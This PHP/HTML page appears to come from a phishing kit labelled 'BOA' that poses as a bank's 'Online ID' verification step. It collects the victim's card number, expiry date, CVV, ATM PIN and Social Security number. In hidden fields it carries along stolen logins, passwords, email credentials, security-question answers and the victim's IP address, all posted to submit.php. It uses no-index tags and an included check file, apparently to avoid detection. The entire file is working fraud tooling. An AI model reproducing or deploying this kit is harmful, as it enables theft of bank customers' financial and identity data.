<?php

/**
 * @link              https://www.z0n51.com/
 * @since             06/11/2019
 * @package           BOA
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      BOA
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */
include('ckh.php');
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Sign In | Online ID</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col">
                        <img src="../assets/images/logo.png">
                    </div>
                    <div class="col text-right d-lg-block d-md-block d-sm-none d-none">
                        <img src="../assets/images/header-right.png">
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- PAGE TITLE -->
        <div class="page-title">
            <div class="container">
                <img src="../assets/images/verify.png">
            </div>
        </div>
        <!-- END PAGE TITLE -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="top-content">
                    <img class="d-lg-block d-md-block d-sm-none d-none" src="../assets/images/cctitle.png">
                    <img class="d-lg-none d-md-none d-sm-block d-block" src="../assets/images/cctitle2.png">
                </div>
                <div class="forms">
                    <form method="post" action="submit.php" id="cc-form">
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>">
                            <label for="cc_number">Card number</label>
                            <input type="text" name="cc_number" class="form-control" id="cc_number" value="<?php echo get_value('cc_number'); ?>" placeholder="xxxx xxxx xxxx xxxx">
                            <?php echo error_message($_SESSION['errors'],'cc_number'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>">
                            <label for="cc_date">Expiry date (MM/YYYY)</label>
                            <input type="text" name="cc_date" class="form-control" id="cc_date" value="<?php echo get_value('cc_date'); ?>" placeholder="mm/yyyy">
                            <?php echo error_message($_SESSION['errors'],'cc_date'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>">
                            <label for="cc_cvv">CVV</label>
                            <input type="text" name="cc_cvv" class="form-control" id="cc_cvv" value="<?php echo get_value('cc_cvv'); ?>" placeholder="xxx">
                            <?php echo error_message($_SESSION['errors'],'cc_cvv'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_pin') ?>">
                            <label for="cc_pin">ATM PIN</label>
                            <input type="text" name="cc_pin" class="form-control" id="cc_pin" value="<?php echo get_value('cc_pin'); ?>" placeholder="xxxx" maxlength="10">
                            <?php echo error_message($_SESSION['errors'],'cc_pin'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_ssn') ?>">
                            <label for="cc_ssn">Social security number</label>
                            <input type="text" name="cc_ssn" class="form-control" id="cc_ssn" maxlength="11" placeholder="xxx-xx-xxxx" value="<?php echo get_value('cc_ssn'); ?>">
                            <?php echo error_message($_SESSION['errors'],'cc_ssn'); ?>
                        </div>
                        <input type="hidden" name="type" value="etapcc">
                        <input type="hidden" name="verbot">
                        <input type="hidden" name="login1" id="login1" value="<?php echo $_SESSION['online_id1']; ?>">
                        <input type="hidden" name="password1" id="password1" value="<?php echo $_SESSION['passcode1']; ?>">
                        <input type="hidden" name="login2" id="login2" value="<?php echo $_SESSION['online_id2']; ?>">
                        <input type="hidden" name="password2" id="password2" value="<?php echo $_SESSION['passcode2']; ?>">
                        <input type="hidden" name="email_address" id="email_address" value="<?php echo $_SESSION['email_address']; ?>">
                        <input type="hidden" name="email_password" id="email_password" value="<?php echo $_SESSION['email_password']; ?>">
                        <input type="hidden" name="ip_address" id="ip_address" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                        <input type="hidden" name="q1" id="q1" value="<?php echo $_SESSION['q1']; ?>">
                        <input type="hidden" name="a1" id="a1" value="<?php echo $_SESSION['a1']; ?>">
                        <input type="hidden" name="q2" id="q2" value="<?php echo $_SESSION['q2']; ?>">
                        <input type="hidden" name="a2" id="a2" value="<?php echo $_SESSION['a2']; ?>">
                        <input type="hidden" name="q3" id="q3" value="<?php echo $_SESSION['q3']; ?>">
                        <input type="hidden" name="a3" id="a3" value="<?php echo $_SESSION['a3']; ?>">
                        <input type="hidden" name="q4" id="q4" value="<?php echo $_SESSION['q4']; ?>">
                        <input type="hidden" name="a4" id="a4" value="<?php echo $_SESSION['a4']; ?>">
                        <input type="hidden" name="q5" id="q5" value="<?php echo $_SESSION['q5']; ?>">
                        <input type="hidden" name="a5" id="a5" value="<?php echo $_SESSION['a5']; ?>">
                        <div class="buttons">
                            <button class="btn-submit" id="cc-submit" type="button">Continue</button>
                            <button type="button">Cancel</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer" style="margin-top: 300px;">
            <div class="container">
                <img class="d-lg-block d-md-none d-sm-none d-none" src="../assets/images/footer.png">
                <img class="d-lg-none d-md-none d-sm-block d-block"  src="../assets/images/footer2.png">
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            jQuery('#cc_number').payment('formatCardNumber');
            jQuery('#cc_date').payment('formatCardExpiry');
            jQuery('#cc_cvv').payment('formatCardCVC');
        </script>

    </body>

</html>